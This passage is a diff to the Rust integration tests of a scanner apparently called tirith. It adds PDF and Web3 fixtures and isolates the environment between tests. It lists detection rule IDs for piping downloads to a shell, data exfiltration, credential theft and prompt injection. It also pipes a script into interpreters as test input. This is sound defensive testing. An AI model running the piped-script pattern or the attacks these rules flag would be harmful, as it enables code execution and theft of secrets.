@@ -8,6 +8,23 @@ use tirith_core::extract::ScanContext;
 use tirith_core::tokenize::ShellType;
 use tirith_core::verdict::Action;
 
+fn isolate_fixture_state() -> tirith_test_support::GlobalStateGuard {
+    let mut global =
+        tirith_test_support::GlobalStateGuard::new().expect("isolate golden-fixture process state");
+    // Non-threat fixtures must not inherit an operator database override. With
+    // these absent, lookup falls back inside the guard's intentionally empty,
+    // isolated XDG data root.
+    global.remove_env("TIRITH_THREATDB_PATH");
+    global.remove_env("TIRITH_THREATDB_SUPPLEMENTAL_PATH");
+    tirith_core::threatdb::ThreatDb::refresh_cache();
+    tirith_core::context_detect::invalidate_cache();
+    global.after_restore(|| {
+        tirith_core::threatdb::ThreatDb::refresh_cache();
+        tirith_core::context_detect::invalidate_cache();
+    });
+    global
+}
+
 #[derive(Debug, Deserialize)]
 struct FixtureFile {
     fixture: Vec<Fixture>,
@@ -24,12 +41,37 @@ struct Fixture {
     shell: String,
     expected_action: String,
     expected_rules: Vec<String>,
+    /// Require exact equality of the unique RuleId projection, rather than the
+    /// legacy subset assertion used by older broad fixtures.
+    #[serde(default)]
+    exact_rules: bool,
     /// Rule IDs that MUST NOT appear — pins double-fire boundaries the
     /// positive-only `expected_rules` list would silently accept.
     #[serde(default)]
     forbidden_rules: Vec<String>,
     #[serde(default)]
     raw_bytes: Vec<u8>,
+    /// Build a real PDF containing this text and use its bytes as the FileScan
+    /// input. Keeps PDF fixtures readable while exercising byte dispatch and the
+    /// real lopdf extraction seam.
+    #[serde(default)]
+    pdf_text: Option<String>,
+    #[serde(default)]
+    pdf_fragments: Vec<String>,
+    #[serde(default)]
+    pdf_tj_fragments: Vec<String>,
+    #[serde(default)]
+    pdf_encoded_text: Option<String>,
+    #[serde(default)]
+    pdf_unsupported_encoding: bool,
+    #[serde(default)]
+    pdf_actual_text: Option<String>,
+    #[serde(default)]
+    pdf_type3_d0: bool,
+    #[serde(default)]
+    pdf_embedded_empty_glyph: bool,
+    #[serde(default)]
+    pdf_hidden: bool,
     /// File path for file-scan context fixtures.
     #[serde(default)]
     file_path: Option<String>,
@@ -37,6 +79,237 @@ struct Fixture {
 
 fn default_shell() -> String {
     "posix".to_string()
+}
+
+#[allow(clippy::too_many_arguments)]
+fn build_pdf_fixture(
+    text_fragments: &[String],
+    tj_fragments: &[String],
+    encoded_text: Option<&str>,
+    actual_text: Option<&str>,
+    hidden: bool,
+    unsupported_encoding: bool,
+    type3_d0: bool,
+    embedded_empty_glyph: bool,
+) -> Vec<u8> {
+    use lopdf::content::{Content, Operation};
+    use lopdf::{Dictionary, Document, Object, Stream};
+
+    let mut operations = if let Some(actual_text) = actual_text {
+        let mut property = Dictionary::new();
+        property.set("ActualText", Object::string_literal(actual_text));
+        vec![
+            Operation::new(
+                "BDC",
+                vec![Object::Name(b"Span".to_vec()), Object::Dictionary(property)],
+            ),
+            Operation::new("EMC", vec![]),
+        ]
+    } else {
+        vec![
+            Operation::new("BT", vec![]),
+            Operation::new("Tf", vec!["F1".into(), if hidden { 0 } else { 12 }.into()]),
+        ]
+    };
+    let mut cmap_entries = Vec::new();
+    if actual_text.is_some() {
+        // ActualText is an extraction replacement and is not itself painted.
+    } else if let Some(encoded_text) = encoded_text {
+        let mut shown = Vec::new();
+        for (index, character) in encoded_text.encode_utf16().enumerate() {
+            let code = u16::try_from(index + 1).expect("fixture text is bounded");
+            shown.extend_from_slice(&code.to_be_bytes());
+            cmap_entries.push((code, character));
+        }
+        operations.push(Operation::new(
+            "Tj",
+            vec![Object::String(shown, lopdf::StringFormat::Hexadecimal)],
+        ));
+    } else if !tj_fragments.is_empty() {
+        let mut items = Vec::new();
+        for (index, text) in tj_fragments.iter().enumerate() {
+            if index > 0 {
+                items.push((-500).into());
+            }
+            items.push(Object::string_literal(text.as_str()));
+        }
+        operations.push(Operation::new("TJ", vec![Object::Array(items)]));
+    } else {
+        operations.extend(
+            text_fragments
+                .iter()
+                .map(|text| Operation::new("Tj", vec![Object::string_literal(text.as_str())])),
+        );
+    }
+    if actual_text.is_none() {
+        operations.push(Operation::new("ET", vec![]));
+    }
+    let content = Content { operations }.encode().expect("encode fixture PDF");
+    let mut doc = Document::with_version("1.5");
+    let pages_id = doc.new_object_id();
+    let mut font = Dictionary::new();
+    font.set("Type", "Font");
+    font.set(
+        "Subtype",
+        if type3_d0 {
+            "Type3"
+        } else if encoded_text.is_some() || unsupported_encoding {
+            "Type0"
+        } else {
+            "Type1"
+        },
+    );
+    font.set("BaseFont", "Helvetica");
+    if type3_d0 {
+        let mut char_procs = Dictionary::new();
+        let char_proc_id = doc.add_object(Stream::new(Dictionary::new(), b"600 0 d0".to_vec()));
+        char_procs.set("A", char_proc_id);
+        let mut encoding = Dictionary::new();
+        encoding.set(
+            "Differences",
+            vec![Object::Integer(65), Object::Name(b"A".to_vec())],
+        );
+        font.set("FontBBox", vec![0.into(), 0.into(), 0.into(), 0.into()]);
+        font.set(
+            "FontMatrix",
+            vec![
+                Object::Real(0.001),
+                0.into(),
+                0.into(),
+                Object::Real(0.001),
+                0.into(),
+                0.into(),
+            ],
+        );
+        font.set("CharProcs", char_procs);
+        font.set("Encoding", encoding);
+        font.set("FirstChar", 65);
+        font.set("LastChar", 65);
+        font.set("Widths", vec![Object::Integer(600)]);
+    } else if encoded_text.is_some() || unsupported_encoding {
+        let mut cid_system_info = Dictionary::new();
+        cid_system_info.set("Registry", Object::string_literal("Adobe"));
+        cid_system_info.set("Ordering", Object::string_literal("Identity"));
+        cid_system_info.set("Supplement", 0);
+        let mut descendant = Dictionary::new();
+        descendant.set("Type", "Font");
+        descendant.set("Subtype", "CIDFontType2");
+        descendant.set("BaseFont", "Helvetica");
+        descendant.set("CIDSystemInfo", cid_system_info);
+        descendant.set("DW", 600);
+        let descendant_id = doc.add_object(descendant);
+        font.set("DescendantFonts", vec![Object::Reference(descendant_id)]);
+        font.set(
+            "Encoding",
+            if unsupported_encoding {
+                "Unsupported-CMap"
+            } else {
+                "Identity-H"
+            },
+        );
+    } else {
+        font.set("FirstChar", 0);
+        font.set("LastChar", 255);
+        font.set(
+            "Widths",
+            (0..=255).map(|_| Object::Integer(600)).collect::<Vec<_>>(),
+        );
+    }
+    if encoded_text.is_some() && !unsupported_encoding {
+        let mut cmap = String::from(
+            "/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n/CMapType 2 def\n",
+        );
+        cmap.push_str(&format!("{} beginbfchar\n", cmap_entries.len()));
+        for (code, character) in &cmap_entries {
+            cmap.push_str(&format!("<{code:04X}> <{character:04X}>\n"));
+        }
+        cmap.push_str("endbfchar\nendcmap\nend\nend\n");
+        let cmap_id = doc.add_object(Stream::new(Dictionary::new(), cmap.into_bytes()));
+        font.set("ToUnicode", cmap_id);
+    }
+    if embedded_empty_glyph {
+        let font_file_id = doc.add_object(Stream::new(Dictionary::new(), Vec::new()));
+        let mut descriptor = Dictionary::new();
+        descriptor.set("Type", "FontDescriptor");
+        descriptor.set("FontName", "Helvetica");
+        descriptor.set("FontFile", font_file_id);
+        font.set("FontDescriptor", doc.add_object(descriptor));
+    }
+    let font_id = doc.add_object(font);
+    let mut fonts = Dictionary::new();
+    fonts.set("F1", font_id);
+    let mut resources = Dictionary::new();
+    resources.set("Font", fonts);
+    let resources_id = doc.add_object(resources);
+    let content_id = doc.add_object(Stream::new(Dictionary::new(), content));
+    let mut page = Dictionary::new();
+    page.set("Type", "Page");
+    page.set("Parent", pages_id);
+    page.set("Contents", content_id);
+    let page_id = doc.add_object(page);
+    let mut pages = Dictionary::new();
+    pages.set("Type", "Pages");
+    pages.set("Kids", vec![Object::Reference(page_id)]);
+    pages.set("Count", 1);
+    pages.set("Resources", resources_id);
+    pages.set("MediaBox", vec![0.into(), 0.into(), 595.into(), 842.into()]);
+    doc.objects.insert(pages_id, Object::Dictionary(pages));
+    let mut catalog = Dictionary::new();
+    catalog.set("Type", "Catalog");
+    catalog.set("Pages", pages_id);
+    let catalog_id = doc.add_object(catalog);
+    doc.trailer.set("Root", catalog_id);
+    let mut bytes = Vec::new();
+    doc.save_to(&mut bytes).expect("save fixture PDF");
+    bytes
+}
+
+fn fixture_raw_bytes(fixture: &Fixture, context: ScanContext) -> Option<Vec<u8>> {
+    if !fixture.pdf_fragments.is_empty() || !fixture.pdf_tj_fragments.is_empty() {
+        Some(build_pdf_fixture(
+            &fixture.pdf_fragments,
+            &fixture.pdf_tj_fragments,
+            fixture.pdf_encoded_text.as_deref(),
+            fixture.pdf_actual_text.as_deref(),
+            fixture.pdf_hidden,
+            fixture.pdf_unsupported_encoding,
+            fixture.pdf_type3_d0,
+            fixture.pdf_embedded_empty_glyph,
+        ))
+    } else if let Some(text) = fixture.pdf_text.as_ref() {
+        Some(build_pdf_fixture(
+            std::slice::from_ref(text),
+            &[],
+            fixture.pdf_encoded_text.as_deref(),
+            fixture.pdf_actual_text.as_deref(),
+            fixture.pdf_hidden,
+            fixture.pdf_unsupported_encoding,
+            fixture.pdf_type3_d0,
+            fixture.pdf_embedded_empty_glyph,
+        ))
+    } else if fixture.pdf_encoded_text.is_some()
+        || fixture.pdf_unsupported_encoding
+        || fixture.pdf_actual_text.is_some()
+        || fixture.pdf_type3_d0
+        || fixture.pdf_embedded_empty_glyph
+    {
+        Some(build_pdf_fixture(
+            &[],
+            &[],
+            fixture.pdf_encoded_text.as_deref(),
+            fixture.pdf_actual_text.as_deref(),
+            fixture.pdf_hidden,
+            fixture.pdf_unsupported_encoding,
+            fixture.pdf_type3_d0,
+            fixture.pdf_embedded_empty_glyph,
+        ))
+    } else if !fixture.raw_bytes.is_empty() {
+        Some(fixture.raw_bytes.clone())
+    } else if matches!(context, ScanContext::Paste | ScanContext::FileScan) {
+        Some(fixture.input.as_bytes().to_vec())
+    } else {
+        None
+    }
 }
 
 fn fixtures_dir() -> PathBuf {
@@ -71,13 +344,7 @@ fn run_fixture(fixture: &Fixture) {
         _ => panic!("Unknown context: {}", fixture.context),
     };
 
-    let raw_bytes = if !fixture.raw_bytes.is_empty() {
-        Some(fixture.raw_bytes.clone())
-    } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
-        Some(fixture.input.as_bytes().to_vec())
-    } else {
-        None
-    };
+    let raw_bytes = fixture_raw_bytes(fixture, scan_context);
 
     let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);
 
@@ -130,14 +397,28 @@ fn run_fixture(fixture: &Fixture) {
         .map(|f| f.rule_id.to_string())
         .collect();
 
-    for expected_rule in &fixture.expected_rules {
-        assert!(
-            found_rules.contains(expected_rule),
-            "Fixture '{}': expected rule '{}' not found. Found rules: {:?}",
-            fixture.name,
-            expected_rule,
-            found_rules
+    if fixture.exact_rules {
+        let mut actual = found_rules.clone();
+        actual.sort();
+        actual.dedup();
+        let mut expected = fixture.expected_rules.clone();
+        expected.sort();
+        expected.dedup();
+        assert_eq!(
+            actual, expected,
+            "Fixture '{}': exact RuleId projection differs",
+            fixture.name
         );
+    } else {
+        for expected_rule in &fixture.expected_rules {
+            assert!(
+                found_rules.contains(expected_rule),
+                "Fixture '{}': expected rule '{}' not found. Found rules: {:?}",
+                fixture.name,
+                expected_rule,
+                found_rules
+            );
+        }
     }
 
     for forbidden in &fixture.forbidden_rules {
@@ -153,6 +434,7 @@ fn run_fixture(fixture: &Fixture) {
 
 #[test]
 fn test_hostname_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("hostname.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -163,6 +445,7 @@ fn test_hostname_fixtures() {
 
 #[test]
 fn test_path_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("path.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -173,6 +456,7 @@ fn test_path_fixtures() {
 
 #[test]
 fn test_transport_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("transport.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -183,6 +467,7 @@ fn test_transport_fixtures() {
 
 #[test]
 fn test_terminal_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("terminal.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -193,6 +478,7 @@ fn test_terminal_fixtures() {
 
 #[test]
 fn test_command_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("command.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -203,6 +489,7 @@ fn test_command_fixtures() {
 
 #[test]
 fn test_ecosystem_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("ecosystem.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -213,6 +500,7 @@ fn test_ecosystem_fixtures() {
 
 #[test]
 fn test_environment_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("environment.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -223,6 +511,7 @@ fn test_environment_fixtures() {
 
 #[test]
 fn test_clean_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("clean.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -233,6 +522,7 @@ fn test_clean_fixtures() {
 
 #[test]
 fn test_shell_weirdness_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("shell_weirdness.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -243,6 +533,7 @@ fn test_shell_weirdness_fixtures() {
 
 #[test]
 fn test_configfile_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("configfile.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -253,6 +544,7 @@ fn test_configfile_fixtures() {
 
 #[test]
 fn test_policy_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("policy.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -265,6 +557,7 @@ fn test_policy_fixtures() {
 /// fixture encodes a contract promised in the README/TIRITH.md.
 #[test]
 fn test_documented_commands_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("documented_commands.toml");
     let count = fixtures.len();
     assert!(
@@ -279,6 +572,7 @@ fn test_documented_commands_fixtures() {
 
 #[test]
 fn test_rendered_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("rendered.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -289,6 +583,7 @@ fn test_rendered_fixtures() {
 
 #[test]
 fn test_credential_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("credential.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -297,8 +592,24 @@ fn test_credential_fixtures() {
     eprintln!("Passed {count} credential fixtures");
 }
 
+/// C05 Web3 source-to-sink contracts. Kept in a dedicated file so later Web3
+/// parser and policy slices can extend the corpus without hiding the DLP
+/// source-only/sink-only boundary among the legacy command fixtures.
+#[test]
+fn test_web3_fixtures() {
+    let _global = isolate_fixture_state();
+    let fixtures = load_fixtures("web3.toml");
+    let count = fixtures.len();
+    assert!(count > 0, "web3.toml must contain C05 boundary fixtures");
+    for fixture in &fixtures {
+        run_fixture(fixture);
+    }
+    eprintln!("Passed {count} Web3 fixtures");
+}
+
 #[test]
 fn test_codefile_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("codefile.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -309,6 +620,7 @@ fn test_codefile_fixtures() {
 
 #[test]
 fn test_cifile_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("cifile.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -319,6 +631,7 @@ fn test_cifile_fixtures() {
 
 #[test]
 fn test_aifile_fixtures() {
+    let _global = isolate_fixture_state();
     let fixtures = load_fixtures("aifile.toml");
     let count = fixtures.len();
     for fixture in &fixtures {
@@ -329,6 +642,7 @@ fn test_aifile_fixtures() {
 
 #[test]
 fn test_threatintel_fixtures() {
+    let mut global = isolate_fixture_state();
     use ed25519_dalek::SigningKey;
     use rand_core::OsRng;
     use tirith_core::threatdb::{Confidence, Ecosystem, ThreatDbWriter, ThreatSource};
@@ -361,8 +675,8 @@ fn test_threatintel_fixtures() {
         .write_to(&supplemental_path, &signing_key)
         .expect("write Maven supplemental fixture");
 
-    std::env::set_var("TIRITH_THREATDB_PATH", &test_db_path);
-    std::env::set_var("TIRITH_THREATDB_SUPPLEMENTAL_PATH", &supplemental_path);
+    global.set_env("TIRITH_THREATDB_PATH", &test_db_path);
+    global.set_env("TIRITH_THREATDB_SUPPLEMENTAL_PATH", &supplemental_path);
     tirith_core::threatdb::ThreatDb::refresh_cache();
 
     let fixtures = load_fixtures("threatintel.toml");
@@ -371,14 +685,11 @@ fn test_threatintel_fixtures() {
         run_fixture(fixture);
     }
     eprintln!("Passed {count} threatintel fixtures");
-
-    std::env::remove_var("TIRITH_THREATDB_PATH");
-    std::env::remove_var("TIRITH_THREATDB_SUPPLEMENTAL_PATH");
-    tirith_core::threatdb::ThreatDb::refresh_cache();
 }
 
 #[test]
 fn test_fixture_count() {
+    let _global = isolate_fixture_state();
     let files = [
         "hostname.toml",
         "path.toml",
@@ -393,6 +704,7 @@ fn test_fixture_count() {
         "configfile.toml",
         "rendered.toml",
         "credential.toml",
+        "web3.toml",
         "codefile.toml",
         "threatintel.toml",
     ];
@@ -405,9 +717,39 @@ fn test_fixture_count() {
     );
 }
 
-/// Verify Tier 1 regex catches all rule-triggering fixtures.
+fn public_sensitive_asset_gate(input: &str) -> bool {
+    use tirith_core::sensitive_assets::{DetectionContext, SensitiveAssetRegistry};
+
+    // Mirror the public portion of the engine's central C04 registry gate. The
+    // registry owns symbolic secret references and structured secret values;
+    // reviewed path candidates are confirmed word-by-word so an unrelated path
+    // elsewhere in prose does not become a fabricated source-to-sink proof.
+    if !SensitiveAssetRegistry::observe(input, DetectionContext::Exec).is_empty() {
+        return true;
+    }
+    for shell in [
+        ShellType::Posix,
+        ShellType::Fish,
+        ShellType::PowerShell,
+        ShellType::Cmd,
+    ] {
+        for segment in tirith_core::tokenize::tokenize(input, shell) {
+            for word in segment.args {
+                if SensitiveAssetRegistry::classify_path(&word).is_some() {
+                    return true;
+                }
+            }
+        }
+    }
+    false
+}
+
+/// Verify the combined production Tier-1 gates catch every rule-triggering
+/// fixture. C04 registry-owned wallet paths and symbolic environment references
+/// are deliberately not duplicated in PATTERN_TABLE.
 #[test]
 fn test_tier1_coverage() {
+    let _global = isolate_fixture_state();
     let files = [
         "hostname.toml",
         "path.toml",
@@ -416,6 +758,7 @@ fn test_tier1_coverage() {
         "command.toml",
         "ecosystem.toml",
         "credential.toml",
+        "web3.toml",
     ];
 
     let mut missed = Vec::new();
@@ -431,6 +774,10 @@ fn test_tier1_coverage() {
                 "paste" => ScanContext::Paste,
                 _ => continue,
             };
+            let shell = fixture
+                .shell
+                .parse::<ShellType>()
+                .unwrap_or(ShellType::Posix);
 
             // Paste: byte scan catches bidi/zero-width/etc., bypassing the tier-1 regex.
             if scan_context == ScanContext::Paste {
@@ -473,9 +820,11 @@ fn test_tier1_coverage() {
                 }
             }
 
-            let regex_triggered = tirith_core::extract::tier1_scan(&fixture.input, scan_context);
+            let regex_triggered =
+                tirith_core::extract::tier1_scan_for_shell(&fixture.input, scan_context, shell);
+            let sensitive_asset_triggered = public_sensitive_asset_gate(&fixture.input);
 
-            if !regex_triggered {
+            if !regex_triggered && !sensitive_asset_triggered {
                 missed.push(format!(
                     "{}:{} (expected {})",
                     filename, fixture.name, fixture.expected_action
@@ -507,6 +856,7 @@ const ALL_FIXTURE_FILES: &[&str] = &[
     "configfile.toml",
     "rendered.toml",
     "credential.toml",
+    "web3.toml",
     "codefile.toml",
     "cifile.toml",
     "aifile.toml",
@@ -623,6 +973,7 @@ const ALL_RULE_IDS: &[&str] = &[
     "workflow_run_trigger",
     "workflow_checkout_untrusted_ref",
     "workflow_cache_poisoning",
+    "workflow_artifact_poisoning",
     "dockerfile_unpinned_image",
     "package_script_dangerous",
     // AI-relevant file hidden-content scan rules
@@ -698,6 +1049,10 @@ const ALL_RULE_IDS: &[&str] = &[
     "prompt_injection_obfuscated",
     // Output-side data-exfiltration rule (C7)
     "output_data_exfiltration",
+    // C10 — Web3 execution-boundary rules.
+    "web3_state_changing_command",
+    "web3_signer_risk",
+    "web3_network_policy_violation",
     // Output-side bounded-analysis gap (R2)
     "output_analysis_overflow",
     // Operational-context rules (M8 ch1)
@@ -855,9 +1210,15 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     "command_network_deny",
     "license_required",
     "custom_rule_match", // requires custom_rules in policy (Team-only)
-    "server_cloaking",   // requires network fetch (Unix-only)
-    "clipboard_hidden",  // requires --html clipboard input
-    "pdf_hidden_text",   // requires .pdf file input
+    // C10 — requires a trusted `web3_guard` declaring networks, denied
+    // endpoints, or allowed signers. A fixture cannot supply one: a
+    // repository-scope policy has its grants neutralized by design, which is
+    // the whole point of C07. Covered by unit tests in `rules::web3_gate`,
+    // including the boundary that an UNCLASSIFIED endpoint is not a violation.
+    "web3_network_policy_violation",
+    "server_cloaking",  // requires network fetch (Unix-only)
+    "clipboard_hidden", // requires --html clipboard input
+    "pdf_hidden_text",  // requires .pdf file input
     // requires >4096 scanner hits in one output stream (unit-tested in
     // rules/output.rs and extract.rs)
     "output_analysis_overflow",
@@ -1060,6 +1421,14 @@ const EXTERNALLY_TRIGGERED_RULES: &[&str] = &[
     // and gets no `tests/fixtures` entry. Covered by unit tests in `scan.rs` +
     // the `scan --ci` / `policy` CLI integration tests.
     "analysis_incomplete",
+    // C15: `workflow_artifact_poisoning` is proven by a REPOSITORY post-pass in
+    // `crate::scan::scan` that correlates a fork-reachable producer workflow with
+    // a privileged `workflow_run` consumer workflow. `struct Fixture` carries
+    // exactly one `input` and one `file_path`, so no fixture can express a
+    // two-workflow chain, and a per-file rule structurally cannot emit it.
+    // Covered by unit tests in `rules::workflow_artifacts` plus the
+    // `tests/workflow_artifact_flow.rs` repository-scan integration tests.
+    "workflow_artifact_poisoning",
     // B5: `python_installed_integrity_violation` is correlated by the
     // installed-tree scan from `crate::artifact::ArtifactSignalKind`s recorded
     // while walking a `site-packages` tree on the filesystem (a RECORD mismatch,
@@ -1130,6 +1499,7 @@ fn collect_output_fixture_rules() -> HashSet<String> {
 /// dedicated fixtures — the analogue of [`test_hostname_fixtures`] etc.
 #[test]
 fn test_output_fixtures() {
+    let _global = isolate_fixture_state();
     use tirith_core::engine::{analyze_output, OutputContext};
 
     for file in OUTPUT_FIXTURE_FILES {
@@ -1191,6 +1561,7 @@ fn test_output_fixtures() {
 /// Pins `output.toml` coverage for the 6 output + 2 prompt-injection rules.
 #[test]
 fn test_output_rule_ids_have_fixture_coverage() {
+    let _global = isolate_fixture_state();
     let covered = collect_output_fixture_rules();
     let required = [
         // M7 ch1
@@ -1225,6 +1596,7 @@ fn test_output_rule_ids_have_fixture_coverage() {
 
 #[test]
 fn test_all_rule_ids_have_fixture_coverage() {
+    let _global = isolate_fixture_state();
     let covered = collect_fixture_rules();
     let excluded: HashSet<&str> = EXTERNALLY_TRIGGERED_RULES.iter().copied().collect();
 
@@ -1295,7 +1667,7 @@ rule_id_variant_registry! {
     // CI / repo supply-chain scan rules
     WorkflowUnpinnedAction, WorkflowDangerousTrigger, WorkflowCurlPipeShell, WorkflowUntrustedInput,
     WorkflowExcessivePermissions, WorkflowRunTrigger, WorkflowCheckoutUntrustedRef,
-    WorkflowCachePoisoning,
+    WorkflowCachePoisoning, WorkflowArtifactPoisoning,
     DockerfileUnpinnedImage, PackageScriptDangerous,
     // AI-relevant file hidden-content scan rules
     NotebookHiddenContent, NotebookSuspiciousOutput, AgentInstructionHidden, SvgScriptEmbedded,
@@ -1330,6 +1702,8 @@ rule_id_variant_registry! {
     OutputDataExfiltration,
     // Output-side bounded-analysis gap (R2)
     OutputAnalysisOverflow,
+    // Web3 execution-boundary rules (C10)
+    Web3StateChangingCommand, Web3SignerRisk, Web3NetworkPolicyViolation,
     // Operational-context rules (M8 ch1)
     ContextProdDestructiveCommand, ContextProdWriteOperation, ContextProdCredentialChange,
     // SSH operational-context rules (M8 ch2)
@@ -1405,6 +1779,7 @@ rule_id_variant_registry! {
 /// enum-derived via the compile-time-enforced [`all_rule_id_variants`]).
 #[test]
 fn test_rule_id_list_is_complete() {
+    let _global = isolate_fixture_state();
     let all_variants = all_rule_id_variants();
     let all_rule_set: HashSet<&str> = ALL_RULE_IDS.iter().copied().collect();
 
@@ -1428,6 +1803,7 @@ fn test_rule_id_list_is_complete() {
 
 #[test]
 fn test_no_url_rules_have_no_url_fixtures() {
+    let _global = isolate_fixture_state();
     // Rules that fire with no URL — they need their own tier-1 pattern (not :// or git@).
     let no_url_rules: HashSet<&str> = [
         "dotfile_overwrite",
@@ -1527,6 +1903,7 @@ fn test_no_url_rules_have_no_url_fixtures() {
 
 #[test]
 fn test_extractor_ids_cover_rule_triggers() {
+    let _global = isolate_fixture_state();
     let ids: HashSet<&str> = tirith_core::extract::extractor_ids()
         .iter()
         .copied()
@@ -1612,6 +1989,7 @@ fn test_extractor_ids_cover_rule_triggers() {
 
 #[test]
 fn test_tier1_does_not_gate_findings() {
+    let _global = isolate_fixture_state();
     let all_fixtures = load_all_fixtures();
     let mut gated = Vec::new();
 
@@ -1632,13 +2010,7 @@ fn test_tier1_does_not_gate_findings() {
             _ => continue,
         };
 
-        let raw_bytes = if !fixture.raw_bytes.is_empty() {
-            Some(fixture.raw_bytes.clone())
-        } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
-            Some(fixture.input.as_bytes().to_vec())
-        } else {
-            None
-        };
+        let raw_bytes = fixture_raw_bytes(fixture, scan_context);
 
         let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);
 
@@ -1679,6 +2051,7 @@ fn test_tier1_does_not_gate_findings() {
 /// (no URLs/commands) must resolve to Allow.
 #[test]
 fn test_non_ascii_paste_not_sole_warn() {
+    let _global = isolate_fixture_state();
     let non_ascii_inputs = [
         "café au lait",
         "日本語テスト",
@@ -1725,14 +2098,17 @@ fn test_non_ascii_paste_not_sole_warn() {
 /// detection (command.rs) would silently gate real attacks.
 #[test]
 fn test_tier1_matches_all_interpreters() {
+    let _global = isolate_fixture_state();
     use tirith_core::extract::{tier1_scan, ScanContext};
     use tirith_core::rules::command::INTERPRETERS;
 
     for name in INTERPRETERS {
-        let input = format!("cat /tmp/s.sh | {name}");
+        let input = format!("cat /tmp/s.sh | {}", name);
         assert!(
             tier1_scan(&input, ScanContext::Exec),
-            "Tier-1 scan does not match plain interpreter '{name}' in '{input}'"
+            "Tier-1 scan does not match plain interpreter '{}' in '{}'",
+            name,
+            input
         );
     }
 
@@ -1810,6 +2186,7 @@ fn default_lab_shell() -> String {
 
 #[test]
 fn test_lab_corpus_reaches_tier3() {
+    let _global = isolate_fixture_state();
     // Walk from `crates/tirith-core` into the sibling `tirith` crate's corpus.
     let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
         .parent()
@@ -1923,14 +2300,13 @@ fn test_lab_corpus_reaches_tier3() {
 
 // M8 ch1 — context-rule integration tests. Exercise the block path by seeding a
 // fake kube context (`KUBECONFIG`) + a context-labels file under a temp repo
-// (`TIRITH_POLICY_ROOT` + a fake `.git` boundary). Serialized on a file-scope
-// mutex (the crate's `TEST_ENV_LOCK` isn't reachable from integration tests).
-
-static CONTEXT_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+// (`TIRITH_POLICY_ROOT` + a fake `.git` boundary). The shared guard serializes
+// these mutations with every engine reader in this test binary and restores the
+// exact incoming environment even when an assertion unwinds.
 
 #[test]
 fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
 
@@ -1958,13 +2334,9 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
     )
     .unwrap();
 
-    // SAFETY: serialized via TEST_ENV_LOCK. Set both env vars before touching
-    // the engine; the disable env MUST be unset here.
-    unsafe {
-        std::env::set_var("KUBECONFIG", kube_path.display().to_string());
-        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
-        std::env::remove_var("TIRITH_CONTEXT_DETECT_DISABLE");
-    }
+    global.set_env("KUBECONFIG", &kube_path);
+    global.set_env("TIRITH_POLICY_ROOT", dir.path());
+    global.remove_env("TIRITH_CONTEXT_DETECT_DISABLE");
     tirith_core::context_detect::invalidate_cache();
 
     let ctx = AnalysisContext {
@@ -1983,13 +2355,6 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
     };
 
     let verdict = engine::analyze(&ctx);
-
-    // Clean up env BEFORE asserting so a failure doesn't pollute the environment.
-    unsafe {
-        std::env::remove_var("KUBECONFIG");
-        std::env::remove_var("TIRITH_POLICY_ROOT");
-    }
-    tirith_core::context_detect::invalidate_cache();
 
     let context_finding = verdict.findings.iter().find(|f| {
         matches!(
@@ -2011,7 +2376,7 @@ fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
 
 #[test]
 fn context_rule_allows_kubectl_get_in_labeled_prod() {
-    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+    let mut global = isolate_fixture_state();
 
     let dir = tempfile::tempdir().unwrap();
     let kube_path = dir.path().join("kubeconfig");
@@ -2034,11 +2399,9 @@ fn context_rule_allows_kubectl_get_in_labeled_prod() {
     )
     .unwrap();
 
-    unsafe {
-        std::env::set_var("KUBECONFIG", kube_path.display().to_string());
